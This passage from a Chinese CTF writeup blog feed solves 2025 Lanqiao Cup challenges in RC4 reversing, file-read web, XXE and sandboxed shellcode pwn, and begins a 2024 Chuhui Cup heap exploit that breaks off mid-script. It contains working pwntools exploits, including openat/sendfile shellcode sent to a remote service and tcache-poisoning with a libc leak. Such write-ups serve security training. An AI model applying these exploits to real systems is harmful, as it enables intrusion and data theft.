调试时可打印：print(f&quot;Decryption failed for key0 &#123;key0_hex&#125;: &#123;e&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    y, cands = items[idx]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cands:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> used:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        inv_map[y] = x</span><br><span class="line">        used.add(x)</span><br><span class="line">        <span class="keyword">if</span> dfs(idx + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        used.remove(x)</span><br><span class="line">        <span class="keyword">del</span> inv_map[y]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动回溯</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting backtracking search...&quot;</span>)</span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> solutions:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No valid solution found. Please check the following:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;- gift and key1_hex are correct&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;- ciphertext matches the encryption logic&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;- Double AES-CBC encryption/decryption logic is consistent with the problem requirements&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found <span class="subst">&#123;<span class="built_in">len</span>(solutions)&#125;</span> solutions&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/04/26/BhgIAb4Vctj3lqG.png" alt="image-20250426134920236"></p><h3 id="逆向分析">逆向分析</h3><h4 id="ShadowPhases">ShadowPhases</h4><p>rc4，ida打开一眼顶针，在strcmp处下断点，windows local调试，点进str2，得到flag</p><p><img src="https://s2.loli.net/2025/04/26/gf8Kc3bMyeYh1dH.png" alt="image-20250426113647552"></p><p><img src="https://s2.loli.net/2025/04/26/j1PvIR9k6zb273i.png" alt="image-20250426113741748"></p><p>flag{0fa830e7-b699-4513-8e01-51f35b0f3293}</p><h4 id="BashBreaker">BashBreaker</h4><p>先是一个于ai的取值对局，ai很蠢直接能过，得到一个密钥不知道有什么用</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131532048-796554111.png" alt="image-20250426131530386"></p><p>翻找旁边的函数表得到有Rc4的逻辑，然后又发现ONE_PIECE疑似密文</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131706759-1117293835.png" alt="image-20250426131706776"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131627335-1222269707.png" alt="image-20250426131627287"></p><p>直接dump下来魔改rc4的逻辑解密就好了</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131813662-1038064357.png" alt="image-20250426131813306"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202504/3445027-20250426131827694-136973100.png" alt="image-20250426131827528"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _QWORD unsigned long</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">48</span>] = &#123;</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCA</span>, <span class="number">0x12</span>, <span class="number">0x14</span>, <span class="number">0xD0</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0xA7</span>, <span class="number">0x91</span>, <span class="number">0x48</span>, <span class="number">0xC3</span>, <span class="number">0x28</span>, <span class="number">0x73</span>, <span class="number">0xAD</span>, <span class="number">0xB7</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0x89</span>, <span class="number">0xCD</span>, <span class="number">0xDD</span>, <span class="number">0x2D</span>, <span class="number">0x50</span>, <span class="number">0x5D</span>, <span class="number">0x7F</span>, <span class="number">0x95</span>, <span class="number">0xB1</span>, <span class="number">0xA4</span>, <span class="number">0x9D</span>, <span class="number">0x09</span>, <span class="number">0x43</span>, <span class="number">0xE1</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xE9</span>, <span class="number">0x66</span>, <span class="number">0xEA</span>, <span class="number">0x18</span>, <span class="number">0x98</span>, <span class="number">0xC6</span>, <span class="number">0xCC</span>, <span class="number">0x02</span>, <span class="number">0x39</span>, <span class="number">0x18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">rc4_init</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [rsp+2h] [rbp-Eh]</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i)</span><br><span class="line">        *(_BYTE*)(a1 + i) = i;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = ((*(_BYTE*)(j % a3 + a2) ^ <span class="number">0x37</span>) + *(<span class="type">unsigned</span> __int8*)(a1 + j) + v6) % <span class="number">256</span>;</span><br><span class="line">        v4 = *(_BYTE*)(a1 + j);</span><br><span class="line">        *(_BYTE*)(a1 + j) = *(_BYTE*)(a1 + v6);</span><br><span class="line">        </span><br><span class="line">        *(_BYTE*)(a1 + v6) = v4;</span><br><span class="line">        <span class="comment">//printf(&quot;%d,&quot;,*(_BYTE*)(a1 + j));</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">260</span>) = <span class="number">0</span>;</span><br><span class="line">    result = a1;</span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">256</span>) = *(_DWORD*)(a1 + <span class="number">260</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">rc4_next</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">256</span>) = (*(_DWORD*)(a1 + <span class="number">256</span>) + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    *(_DWORD*)(a1 + <span class="number">260</span>) = (*(_DWORD*)(a1 + <span class="number">260</span>) + *(<span class="type">unsigned</span> __int8*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>))) % <span class="number">256</span>;</span><br><span class="line">    v3 = *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>));</span><br><span class="line">    *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>)) = *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">260</span>));</span><br><span class="line">    *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">260</span>)) = v3;</span><br><span class="line">    v2 = *(_BYTE*)(a1 + (<span class="type">unsigned</span> __int8)(*(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">256</span>)) + *(_BYTE*)(a1 + *(<span class="type">int</span>*)(a1 + <span class="number">260</span>))));</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">16</span> * v2) | (<span class="type">unsigned</span> <span class="type">int</span>)(v2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> real_key[] = <span class="string">&quot;EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD&quot;</span>;</span><br><span class="line">    rc4_init((<span class="type">long</span> <span class="type">long</span>)key, (<span class="type">long</span> <span class="type">long</span>)real_key, <span class="keyword">sizeof</span>(real_key)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++) &#123;</span><br><span class="line">        data[i] ^= rc4_next((<span class="type">long</span> <span class="type">long</span>)key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{8263b6c6-094d-4bd8-bbc2-b63ab34e8db7}</p><h3 id="情报收集">情报收集</h3><h4 id="黑客密室逃脱">黑客密室逃脱</h4><p>文件读取，访问/file?name=/app/app.py可以得到源码，审计代码</p><p>访问/file?name=hidden.txt,得到密钥</p><p><img src="https://s2.loli.net/2025/04/26/V64CfOy5RYnFgtG.png" alt="image-20250426114137286"></p><p>访问/logs，得到密文</p><p><img src="https://s2.loli.net/2025/04/26/V64CfOy5RYnFgtG.png" alt=""></p><p>得到flag</p><p>exp</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_data(encrypted_hex, key):</span><br><span class="line">    # Convert hex string <span class="keyword">to</span> bytes</span><br><span class="line">    <span class="keyword">encrypted</span> = bytes.fromhex(encrypted_hex)</span><br><span class="line">    decrypted = bytearray()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">index</span> <span class="keyword">in</span> range(len(<span class="keyword">encrypted</span>)):</span><br><span class="line">        <span class="type">char</span> = <span class="keyword">encrypted</span>[<span class="keyword">index</span>]</span><br><span class="line">        key_char = key[<span class="keyword">index</span> % len(key)]</span><br><span class="line">        # <span class="keyword">Perform</span> decryption <span class="keyword">by</span> subtracting the key <span class="type">character</span></span><br><span class="line">        decrypted.append(<span class="type">char</span> - ord(key_char))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted.decode()</span><br><span class="line"></span><br><span class="line"># <span class="keyword">Encrypted</span> data <span class="keyword">and</span> key</span><br><span class="line">encrypted_hex = <span class="string">&#x27;d9d1c4d9e0d795a49ab19a976366a8c794d692a8929ecba69a6a6872a09a94a397acc29f99df6a9468b6&#x27;</span></span><br><span class="line">key = &quot;secret_key8129&quot;</span><br><span class="line"></span><br><span class="line"># Decrypt <span class="keyword">and</span> print the result</span><br><span class="line">print(decrypt_data(encrypted_hex, key))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/04/26/4g93Z7DVOzmpYNJ.png" alt="image-20250426114238954"></p><p>flag{c6958bf1-5b1d-433f-b969-51128c44f2c6}</p><h3 id="漏洞挖掘分析">漏洞挖掘分析</h3><h4 id="RuneBreach">RuneBreach</h4><p>程序就是写了一个打怪逻辑，当n100&lt;0的时候，会给一次执行shellcode的机会，或者输入别的后续有个栈溢出</p><p><img src="https://s2.loli.net/2025/04/26/tI3vJKVNpsxuzE4.png" alt="image-20250426114842604"></p><p><img src="https://s2.loli.net/2025/04/26/63aAvlCUMQqcrFH.png" alt="image-20250426115005757"></p><p>但这个题目开启了沙盒，明显读入orw的shellcode更快<img src="https://s2.loli.net/2025/04/26/vTm6pubnGIoMFea.png" alt="image-20250426115043418"></p><p>随便输入字符串进入BOSS环节，输入orw的shellcode，得到flag</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;8.147.132.32&#x27;</span>,<span class="number">18505</span>)</span><br><span class="line">#p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;\nDefend? (y/N): &quot;</span>)</span><br><span class="line">p<span class="number">.</span>sendline(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>recvuntil(<span class="string">&quot;[BOSS] Say your last word to your territory: &quot;</span>)</span><br><span class="line">payload=asm(<span class="string">&#x27;&#x27;&#x27;</span>    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f2e</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rdi</span>, <span class="number">100</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">r10</span>, <span class="built_in">r10</span></span><br><span class="line">    <span class="keyword">push</span> SYS_openat</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>, <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">push</span> SYS_sendfile</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>sendline(payload)</span><br><span class="line"></span><br><span class="line">p<span class="number">.</span>interactive()</span><br></pre></td></tr></table></figure><p>flag{33dc7e62-e555-40b6-8f72-1b24d6e6cb44}</p><p><img src="https://s2.loli.net/2025/04/26/yHMfXh6eaiRWgY4.png" alt="image-20250426125621468"></p><h4 id="星际XML解析器">星际XML解析器</h4><p>xxe攻击，直接传个payload就行了</p><p><img src="https://s2.loli.net/2025/04/26/zLgsvR8aOKUeyqQ.png" alt="image-20250426115525208"></p><p><img src="https://s2.loli.net/2025/04/26/9SrFnlZ2HzRVWQt.png" alt="image-20250426115508494"></p><p>flag{7826b63b-5646-4920-8f01-b26b1806a979}</p>]]></content>
    
    
    <summary type="html">2025蓝桥杯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024楚慧杯</title>
    <link href="https://www.thir0th.xyz/posts/cb11c07b.html"/>
    <id>https://www.thir0th.xyz/posts/cb11c07b.html</id>
    <published>2025-04-20T06:40:35.000Z</published>
    <updated>2025-04-20T06:42:37.910Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>2024楚慧杯</h1><h3 id="EZheap-2">EZheap_2</h3><p>2.27堆题<br>add,free,edit三个功能</p><p>of by one漏洞，有沙盒</p><p>函数一个gift给出pie地址</p><p>我们可以攻击stdout_attack泄露libc</p><p>后续攻击free_hook为setcontect+53，构造出read读入shellcode</p><p>或者泄露environ劫持rbp+8<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1734955053742-cd9ac187-b081-4572-984c-fd2d05b88dd4.png" alt=""></p><p>shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;139.155.126.78&#x27;,16215)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size:&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;context: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def gift():</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;choose:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line"></span><br><span class="line">add(0,0x18)  #0</span><br><span class="line">add(1,0x68)  #1</span><br><span class="line">add(2,0x68)  #2</span><br><span class="line">add(3,0x18)  #3</span><br><span class="line">edit(0,b&#x27;\x00&#x27;*0x18+p8(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(4,0xd8)  </span><br><span class="line">gift()</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">pie_base=int(p.recv(12),16)-0x202160</span><br><span class="line">li(hex(pie_base))</span><br><span class="line">free(2)</span><br><span class="line">edit(4,b&#x27;\x00&#x27;*0x68+p64(0x71)+p64(pie_base+0x202020)) </span><br><span class="line">add(5,0x68)</span><br><span class="line">add(6,0x68)</span><br><span class="line">add(7,0x68)</span><br><span class="line">edit(7,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span><br><span class="line">libc_base=get_addr64()-0x3ed8b0</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">jmp_rsp=libc_base+libc.search(asm(&quot;jmp rsp&quot;)).__next__()</span><br><span class="line">free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">open_addr=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read_addr=libc_base + 